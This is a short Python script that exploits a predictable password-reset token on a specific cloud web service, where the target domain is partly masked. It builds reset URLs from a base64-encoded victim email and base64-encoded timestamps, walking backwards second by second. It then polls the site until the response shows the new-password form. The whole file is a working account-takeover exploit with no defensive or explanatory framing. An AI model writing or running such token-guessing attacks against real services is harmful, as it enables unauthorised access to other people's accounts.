#! /usr/bin/python3

import urllib.request
import datetime
import base64
import time

#30/03/2017 16:47:52

user = "program**@yopmail.com"

now = datetime.datetime.now()
i = 0
while True:
    minshift, seconds = divmod(now.second - i, 60)
    hourshift, minutes = divmod(now.minute + minshift, 60)
    hours = now.hour + hourshift
    i += 1;
    
    token = "{}/{}/{} {}:{}:{}".format("%02d" % (now.day+1), "%02d" % now.month, now.year, "%02d" % hours, "%02d" % minutes, "%02d" % seconds)

    url = "https://www.mn*****cloud.net/Paginas/Cloud/Contrasena.aspx?q=" + base64.b64encode(user.encode('utf-8')).decode('utf-8') + "&t=" + base64.b64encode(token.encode('utf-8')).decode('utf-8') + "&p=2"
    
    print("Probando: " + token)
    print(url + "\n")

    txt = urllib.request.urlopen(url).read()
    if (txt.find(b'Vuelva a solicitar ') < 0):
        if (txt.find(b'Introduzca la nueva ') > 0):
            print("ENCONTRADO!")
            break
        else:
            print("ERROR")
            
    time.sleep(2)
